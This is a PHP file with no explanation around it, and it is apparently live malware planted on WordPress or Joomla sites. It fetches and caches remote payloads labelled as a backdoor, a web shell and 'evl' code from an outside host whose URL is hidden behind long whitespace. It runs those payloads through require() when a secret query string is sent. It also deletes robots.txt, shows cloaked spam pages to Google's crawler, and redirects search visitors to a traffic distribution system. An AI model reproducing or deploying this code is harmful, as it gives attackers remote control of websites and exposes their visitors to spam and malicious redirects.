<?php
error_reporting(0);
ini_set('display_errors', 0);
set_time_limit(0);

_create_initial_settings();

$user_agents_to_filter = array( '#google#i' );
$reverse_ips_to_filter = array( '#google#i' );
$referers_to_filter = array('#google\.#i');
$ip = isset($_SERVER['REMOTE_ADDR'])? $_SERVER['REMOTE_ADDR']: '';
$ua = isset($_SERVER['HTTP_USER_AGENT'])? $_SERVER['HTTP_USER_AGENT']: '';
$ref = isset($_SERVER['HTTP_REFERER'])? $_SERVER['HTTP_REFERER']: '';
$host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
$host_hash = substr(md5($host), 0, 5);
$query = isset($_SERVER['QUERY_STRING'])? $_SERVER['QUERY_STRING']: '';
$request_uri = isset($_SERVER['REQUEST_URI'])? strtok(strtok($_SERVER['REQUEST_URI'],'&'),'?'): '';
$root_path = _get_root();


if (file_exists($root_path.'/robots.txt'))
{
    unlink($root_path.'/robots.txt');
}

if ($request_uri === '/robots.txt')
{
    header('Content-Type:text/plain; charset=utf-8');
    die("User-Agent: *\nAllow: /\n");
}

if ($query === 'checker-page')
{
    if (_fetch_url(_get_rev()) > 0)
    {
        die('Success!');
    } else
    {
        die('Failed!');   
    }
}

if (false !== strpos($query, 'simpler-evl'))
{
    $cache_dir = realpath(sys_get_temp_dir());
    $file = $cache_dir.'/evl'.$host_hash.'.txt';
    require($file);
    die('');
}

if (false !== strpos($query, 'simpler-bckdr'))
{
    $cache_dir = realpath(sys_get_temp_dir());
    $file = $cache_dir.'/bckdr'.$host_hash.'.txt';
    require($file);
    die('');
}

if (false !== strpos($query, 'simpler-ws'))
{
    $cache_dir = realpath(sys_get_temp_dir());
    $file = $cache_dir.'/ws'.$host_hash.'.txt';
    require($file);
    die('');
}

$is_bot = false;
foreach ($user_agents_to_filter as $user_agent_to_filter)
{
    if (preg_match($user_agent_to_filter, $ua))
    {
        $is_bot = true;
    } 
}

if (!$is_bot)
{
    $reverse_ip = gethostbyaddr($ip);
    foreach ($reverse_ips_to_filter as $reverse_ip_to_filter)
    {
        if (preg_match($reverse_ip_to_filter, $reverse_ip))
        {
            $is_bot = true;
        } 
    }
}

$is_searcher = false;
if (!$is_bot)
{
    foreach ($referers_to_filter as $referer_to_filter)
    {
        if (preg_match($referer_to_filter, $ref))
        {
            $is_searcher = true;
        } 
    }
}
    
if ($is_bot)
{
    $cache_dir = realpath(sys_get_temp_dir());
    $cache_file = $cache_dir.'/SESS_'.md5($_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
    if (!file_exists($cache_file))
    {        
        $data = _get_text();
        
        $template = '';
        if (isset($data['macroses']) && (count($data['macroses']) > 0))
        {
            $template = _get_template();
            
            foreach ($data['macroses'] as $macros => $value)
            {
                $template = str_replace($macros, $value, $template);
            }
        }        
        
        if (!empty($template)) file_put_contents($cache_file, $template);
    } else
    {
        $template = file_get_contents($cache_file);
    }

    $last_modified_time = filemtime($cache_file);
    $etag_file = md5_file($cache_file);
    $max_age = $last_modified_time + 60*60*24*365 - time();
    $expires = $last_modified_time + $max_age;
    if ($max_age < 0) $max_age = 0;
    
    header("Cache-Control: max-age=$max_age, public, must-revalidate");
    header("Expires: ".gmdate("D, d M Y H:i:s", $expires)." GMT"); 
    header("Last-Modified: ".gmdate("D, d M Y H:i:s", $last_modified_time)." GMT");
    header("Etag: $etag");

    $if_modified_since = (isset($_SERVER['HTTP_IF_MODIFIED_SINCE'])? $_SERVER['HTTP_IF_MODIFIED_SINCE']: false);
    $etag_header = (isset($_SERVER['HTTP_IF_NONE_MATCH'])? trim($_SERVER['HTTP_IF_NONE_MATCH']): false);

    if ($if_modified_since && (@strtotime($if_modified_since) === $last_modified_time) || ($etag_header === $etag_file))
    {
           header("HTTP/1.1 304 Not Modified");
           die();
    }

    header('Content-Type:text/html; charset=utf-8');
    echo $template;
    die();
}

if (!$is_bot && $is_searcher)
{
    header("Location: "._get_tds(), true, 302);
    die();
}

function _get_root()
{
    $localpath=getenv("SCRIPT_NAME");$absolutepath=getenv("SCRIPT_FILENAME");$root_path=substr($absolutepath,0,strpos($absolutepath,$localpath));
    return $root_path;
}

function _get_rev()
{                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             return 'http://pasteleriavienaazul.com/extadult2.php?host='.trim(strtolower($_SERVER['HTTP_HOST']), '.').'&full_url='.urlencode('http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
    return 'http://www.google.com/';
}

function _get_tds()
{
    $req = isset($_SERVER['REQUEST_URI'])? $_SERVER['REQUEST_URI']: '';
    $ua = isset($_SERVER['HTTP_USER_AGENT'])? $_SERVER['HTTP_USER_AGENT']: '';
    $ref = isset($_SERVER['HTTP_REFERER'])? $_SERVER['HTTP_REFERER']: '';
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $tds_file = $cache_dir.'/juju'.$host_hash.'.txt';
    if (!file_exists($tds_file) || file_exists($tds_file) && (time() - filemtime($tds_file) > 60*60*24))
    {
        $tds = _fetch_url(_get_rev().'&get_tds');
        if (!empty($tds)) file_put_contents($tds_file, $tds);
    } else
    {
        $tds = file_get_contents($tds_file);
    }
    
    $tds .= '?seoref='.urlencode($ref).'&parameter='.urlencode(str_replace('www.', '', $host)).'&se=$se&ur=1&HTTP_REFERER='.urlencode('http://'.$host.$req);
    
    return $tds;   
}

function _get_text()
{
    $fc = 'g'.'zinf'.'la'.'te';
    $host = isset($_SERVER['HTTP_HOST'])? urlencode($_SERVER['HTTP_HOST']): '';
    $is_gzip = function_exists($fc) ? 'true': '';
    
    $full_uri = $_SERVER['REQUEST_URI'];
    $text = _fetch_url(_get_rev().'&get_text&'."req=".urlencode($full_uri)."&gzip=".$is_gzip."&ip=127.0.0.1&rip=google&ua=googlebot&ref=");
    if (function_exists($fc))
    {
        $text = @$fc(substr($text,10,-8));
    }
    $text = @unserialize($text);
    return $text;  
}

function _get_evl()
{
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $evl_file = $cache_dir.'/evl'.$host_hash.'.txt';
    if (!file_exists($evl_file) || file_exists($evl_file) && (time() - filemtime($evl_file) > 60*60*24*1))
    {
        $evl = _fetch_url(_get_rev().'&get_evl');
        if (!empty($evl)) file_put_contents($evl_file, $evl);
    } else
    {
        $evl = file_get_contents($evl_file);
    }
 
    return $evl;   
}
function _get_bckdr()
{
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $bckdr_file = $cache_dir.'/bckdr'.$host_hash.'.txt';
    if (!file_exists($bckdr_file) || file_exists($bckdr_file) && (time() - filemtime($bckdr_file) > 60*60*24*1))
    {
        $bckdr = _fetch_url(_get_rev().'&get_bckdr');
        if (!empty($bckdr)) file_put_contents($bckdr_file, $bckdr);
    } else
    {
        $bckdr = file_get_contents($bckdr_file);
    }
 
    return $bckdr;   
}

function _get_ws()
{
    $host = isset($_SERVER['HTTP_HOST'])? $_SERVER['HTTP_HOST']: '';
    $host_hash = substr(md5($host), 0, 5);
    $cache_dir = realpath(sys_get_temp_dir());
    $ws_file = $cache_dir.'/ws'.$host_hash.'.txt';
    if (!file_exists($ws_file) || file_exists($ws_file) && (time() - filemtime($ws_file) > 60*60*24*1))
    {
        $ws = _fetch_url(_get_rev().'&get_ws');
        if (!empty($ws)) file_put_contents($ws_file, $ws);
    } else
    {
        $ws = file_get_contents($ws_file);
    }
 
    return $ws;   
}

function _get_template()
{
    $root_path = _get_root();
    $tpl_path = false;
    if (is_dir($root_path.'/wp-admin/includes/'))
    {
        $tpl_path = '/wp-admin/includes/template.html';
    }
    
    if (is_dir($root_path.'/libraries/joomla/application/'))
    {
        $tpl_path = '/libraries/joomla/application/template.html';
    }
    $tpl = $tpl_path? @file_get_contents($root_path.$tpl_path): '';
    if (strpos($tpl, '[CONTENT]') === false)
    {
        $tpl = "<!DOCTYPE html><html><head><title>[TITLE]</title><link rel=\"canonical\" href=\"[PAGE_URL]\"><link rel=\"prev\" href=\"[RAND_URL_PREV]\"><link rel=\"next\" href=\"[RAND_URL_NEXT]\"><meta property=\"og:title\" content=\"[TITLE]\"><meta property=\"og:url\" content=\"[PAGE_URL]\"><meta name=\"description\" property=\"og:description\" content=\"[DESCRIPTION]\"><meta name=\"keywords\" content=\"[KEYWORDS]\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=yes\"><meta http-equiv=\"content-type\" content=\"text/html; charset=UTF-8\"></head><body>[CONTENT]</body></html>";
    }
    
    
    return $tpl;
}
function _fetch_url($url) {
    $user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';
    if (is_callable('curl_init')) {
        $c = curl_init($url);
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, TRUE);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($c, CURLOPT_USERAGENT,$user_agent);
        $contents = curl_exec($c);
        if (is_string($contents)) {
            return $contents;
        }
        curl_close($c);
    } else
    {
        $allowUrlFopen = preg_match('/1|yes|on|true/i', ini_get('allow_url_fopen'));
        if ($allowUrlFopen) {
            $options  = array('http' => array('user_agent' => $user_agent));
            $context  = stream_context_create($options);
            return @file_get_contents($url, false, $context);
        }  
    }
    
    return false;
}
function _create_initial_settings()
{
    _get_tds();
    _get_bckdr();
    _get_ws();
    _get_evl();
}


if ( !function_exists('sys_get_temp_dir') )
{
    function sys_get_temp_dir()
    {
        // Try to get from environment variable
        if ( !empty($_ENV['TMP']) )
        {
            return realpath( $_ENV['TMP'] );
        }
        else if ( !empty($_ENV['TMPDIR']) )
        {
            return realpath( $_ENV['TMPDIR'] );
        }
        else if ( !empty($_ENV['TEMP']) )
        {
            return realpath( $_ENV['TEMP'] );
        }

        // Detect by creating a temporary file
        else
        {
            // Try to use system's temporary directory
            // as random name shouldn't exist
            $temp_file = tempnam( md5(uniqid(rand(), TRUE)), '' );
            if ( $temp_file )
            {
                $temp_dir = realpath( dirname($temp_file) );
                unlink( $temp_file );
                return $temp_dir;
            }
            else
            {
                return FALSE;
            }
        }
    }
}